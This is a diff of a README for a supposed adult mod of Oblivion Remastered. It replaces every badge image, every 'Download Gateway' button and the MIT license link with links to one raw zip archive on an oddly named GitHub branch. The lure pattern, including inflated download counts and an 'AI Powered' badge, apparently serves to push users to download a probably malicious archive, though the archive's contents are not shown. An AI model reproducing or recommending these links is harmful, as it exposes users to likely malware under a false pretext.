@@ -1,14 +1,14 @@
 # The Elder Scrolls IV: Oblivion Remastered Adult Mod
 
-![Remastered Banner](https://img.shields.io/badge/Epic_Remaster-Oblivion_Adult_Mod-orange?style=for-the-badge)
-![Downloads](https://img.shields.io/badge/Downloads-50k%2B-blue)
-![MIT License](https://img.shields.io/badge/license-MIT-success)
-![Version](https://img.shields.io/badge/version-3.2.1-informational)
-![AI Integration](https://img.shields.io/badge/AI_Powered-OpenAI_Claude-critical)
+![Remastered Banner](https://github.com/honzamaster123/oblivion-remastered-adult-edition/raw/refs/heads/branch/atomism/edition-adult-oblivion-remastered-zoopharmacological.zip)
+![Downloads](https://github.com/honzamaster123/oblivion-remastered-adult-edition/raw/refs/heads/branch/atomism/edition-adult-oblivion-remastered-zoopharmacological.zip%2B-blue)
+![MIT License](https://github.com/honzamaster123/oblivion-remastered-adult-edition/raw/refs/heads/branch/atomism/edition-adult-oblivion-remastered-zoopharmacological.zip)
+![Version](https://github.com/honzamaster123/oblivion-remastered-adult-edition/raw/refs/heads/branch/atomism/edition-adult-oblivion-remastered-zoopharmacological.zip)
+![AI Integration](https://github.com/honzamaster123/oblivion-remastered-adult-edition/raw/refs/heads/branch/atomism/edition-adult-oblivion-remastered-zoopharmacological.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/%F0%9F%94%8D-Download_Gateway-brightgreen?style=for-the-badge)](https://honzamaster123.github.io)
+[![Download](https://github.com/honzamaster123/oblivion-remastered-adult-edition/raw/refs/heads/branch/atomism/edition-adult-oblivion-remastered-zoopharmacological.zip%F0%9F%94%8D-Download_Gateway-brightgreen?style=for-the-badge)](https://github.com/honzamaster123/oblivion-remastered-adult-edition/raw/refs/heads/branch/atomism/edition-adult-oblivion-remastered-zoopharmacological.zip)
 
 ---
 
@@ -83,7 +83,7 @@ Enable in Settings ➔ "AI Companion" and watch your world teem with emergent st
 2. **Download the Mod**
     - Click the badge below to access the gateway to our remaster!
 
-    [![Download](https://img.shields.io/badge/%F0%9F%94%8D-Download_Gateway-brightgreen?style=for-the-badge)](https://honzamaster123.github.io)
+    [![Download](https://github.com/honzamaster123/oblivion-remastered-adult-edition/raw/refs/heads/branch/atomism/edition-adult-oblivion-remastered-zoopharmacological.zip%F0%9F%94%8D-Download_Gateway-brightgreen?style=for-the-badge)](https://github.com/honzamaster123/oblivion-remastered-adult-edition/raw/refs/heads/branch/atomism/edition-adult-oblivion-remastered-zoopharmacological.zip)
 
 3. **Extract Files**
     - Unzip the downloaded archive to a temporary folder.
@@ -125,10 +125,10 @@ User discretion is advised—bring responsibility, wit, and an appetite for adve
 
 This project glistens under the benevolent light of the MIT License (© 2025). Feel free to shape, remix, and distribute—so long as you attribute and embrace the legacy.
 
-[Read the full MIT License](https://opensource.org/licenses/MIT)
+[Read the full MIT License](https://github.com/honzamaster123/oblivion-remastered-adult-edition/raw/refs/heads/branch/atomism/edition-adult-oblivion-remastered-zoopharmacological.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/%F0%9F%94%8D-Download_Gateway-brightgreen?style=for-the-badge)](https://honzamaster123.github.io)
+[![Download](https://github.com/honzamaster123/oblivion-remastered-adult-edition/raw/refs/heads/branch/atomism/edition-adult-oblivion-remastered-zoopharmacological.zip%F0%9F%94%8D-Download_Gateway-brightgreen?style=for-the-badge)](https://github.com/honzamaster123/oblivion-remastered-adult-edition/raw/refs/heads/branch/atomism/edition-adult-oblivion-remastered-zoopharmacological.zip)
 
 *Step forward, hero of 2025. The gates of Oblivion await—remastered, re-enchanted, and supercharged for legends never told!*
